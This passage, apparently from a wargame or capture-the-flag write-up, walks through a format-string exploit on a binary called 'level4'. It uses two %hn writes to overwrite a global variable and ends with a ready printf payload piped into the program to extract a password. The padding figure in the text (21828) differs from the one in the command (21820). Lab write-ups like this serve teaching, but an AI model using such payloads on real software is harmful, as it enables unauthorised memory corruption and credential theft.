AAAA lands at %12$. So our buffer's first 4 bytes are accessible as %12$, the next 4 
as %13$.

  ----------------------------------------------------------------------------------

  m value is 16.930.116 (0x01025544 in decimal). Printing ~17 million spaces to reach
  that count would be enormous and slow.

  The trick to do it is to une %hn (half-word write, 16 bits at a time) to split it
  into smaller writes:

  NOTE: 16-bit -> 0 to 65536 values

    write 0x5544 to m   (= addr 0x08049810)
	write 0x0102 to m+2 (= addr 0x08049812)
  
  ----------------------------------------------------------------------------------

  To build the payload we'll use the following formula:

  [addr_low][addr_high][padding_1][%12$hn][padding_2][%13$hn]

  padding_1 = 21828 (0x5544 in decimal)

  258 (0x0102 in decimal) + 65536 = 65794
  padding_2 = 65794 - 21828 => 43966

  \x10\x98\x04\x08 + \x12\x98\x04\x08 + %21828x + %12$hn + %43966x + %13$hn

  ----------------------------------------------------------------------------------

  After some tries we realised that the password was lost in the ~65KB of "garbage"
  (our padding) so to be sure to get to have it the cleanest way was to filter the
  lines that looked like a password (64 hex chars):

  printf '\x10\x98\x04\x08\x12\x98\x04\x08%%21820x%%12$hn%%43966x%%13$hn' \
  | /home/user/level4/level4 \
  | grep -oE '[0-9a-f]{64}'
